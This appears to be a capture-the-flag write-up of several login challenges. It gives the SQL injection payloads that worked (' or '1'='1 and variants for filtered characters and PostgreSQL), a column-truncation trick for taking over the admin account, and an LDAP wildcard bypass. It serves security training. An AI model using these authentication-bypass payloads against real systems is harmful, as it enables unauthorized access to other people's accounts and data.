# SQLi
## Most basic SQLi pattern


Based on the title we assumed it was pretty simple, so we tried escaping the input portion of the select statement. Below is what we imagined the query is.

```sql
select * from users where name = '' and password = '';
```

So this is what we're doing when passing user input, we have to break out of the ```initial name = ''``` by adding a ```'``` now we can pass our own portion of the query as listed below. Remember we still have that extra ```'``` that's why we didn't add it ourselves.

```sql
' or '1'='1
```

So the query will be passed as;

```sql
select * from users where name = '' or '1'='1' and password = '' or '1'='1';
```

## ACL rulezz the world.

Takes input value from dropdown rather than from textfield, so to edit what is getting passed we're going to inspect the form where it posts. There you will find the 3 options from the dropdown.

```<option value = "admin">admin</option> == $0```

In the ```option value``` this is where we break out to do our SQL injection.

```sql
' or '1'='1
```

Final;

```sql
<option value = "' or '1'='1">admin</option> == $0```

## Login portal 1

First off `=` is a forbidden character so we'll have to modify our base breakout script a bit, with a different operand such as `>` Secondly the error output gives 1 useful hint and that is what we just coverd.

So currently our breakout looks like this;

```sql
' or '1'>'0
```

but that doesn't seem to do the trick, so after some frustration and luck. We realized it had to be this;

```sql
admin' or '1'>'0
```

## Random Login Form

So in this challenge we looked for some output that would sort of give us a hint. In this case it was the registeration form showing us that we could register as admin if we override the user field.

We figured that out by registering with the same name twice using;

```sql
' or '1'>'0```

This occurs because SQL truncates the field if it's longer than the set limit. So by typing admin with a bunch of spaces and then 1 we can accomplish that.

```
admin                                                   1```

then set the password to whatever and then login with whatever you just set.

## Just another login form

This form is using LDAP(Lightweight Directory Access Protocol) it's used to store user information. We figured out it's using LDAP by trying basic SQLi.

The returned error was `bad search filter` which pointed directly to LDAP. By passing `*` in both user and pass fields it will log you in a as the first user in the LDAP tree.

## Po po po po postgresql

admin') or '2'>'1' or ('1'>'0
